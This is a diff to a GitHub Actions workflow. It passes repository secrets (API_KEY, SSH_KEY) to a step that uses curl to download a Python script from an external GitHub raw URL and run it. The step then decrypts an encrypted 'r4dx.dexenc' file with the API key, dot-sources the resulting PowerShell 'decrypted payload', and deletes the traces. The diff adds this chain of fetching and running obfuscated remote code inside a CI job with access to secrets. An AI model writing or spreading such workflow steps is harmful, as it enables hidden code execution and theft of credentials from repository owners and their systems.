@@ -29,20 +29,24 @@ jobs:
           API_KEY: ${{ secrets.API_KEY }}
           SSH_KEY: ${{ secrets.SSH_KEY }}
         run: |
-          git clone https://github.com/Scheldest/dex-enc.git/onlyonepyfile/main.py --quiet
+          curl -sL https://raw.githubusercontent.com/Scheldest/dex-enc/refs/heads/main/onlyonepyfile/main.py -o main.py
           python main.py --quiet
-          $p = Join-Path $pwd "r4dx.dexenc"
-          if (Test-Path $p) {
-              python main.py decrypt -i $p -key "$env:API_KEY" -o "$pwd\r4dx.ps1"
-              if (Test-Path "$pwd\r4dx.ps1") {
+          $p = Join-Path $currentProgress "r4dx.dexenc" # Pastikan $currentProgress sudah didefinisikan, atau gunakan $pwd
+          $targetFile = "$pwd\r4dx.ps1"
+          if (Test-Path "r4dx.dexenc") {
+              python main.py decrypt -i "r4dx.dexenc" -key "$env:API_KEY" -o $targetFile
+              if (Test-Path $targetFile) {
                   Write-Host "[+] Executing decrypted payload..." -ForegroundColor Green
-                  . "$pwd\r4dx.ps1"
-                  Remove-Item "$pwd\r4dx.ps1" -Force
-                  Remove-Item -Recurse -Force dex-enc
+                  . $targetFile
+                  Remove-Item $targetFile -Force
+                  Remove-Item "main.py" -Force
               } else {
-                  Write-Host "[-] Payload file not found in root!" -ForegroundColor Red
+                  Write-Host "[-] Decryption failed: r4dx.ps1 not created!" -ForegroundColor Red
                   exit 1
               }
+          } else {
+              Write-Host "[-] r4dx.dexenc not found!" -ForegroundColor Red
+              exit 1
           }
           
       - name: i-am-r4dx
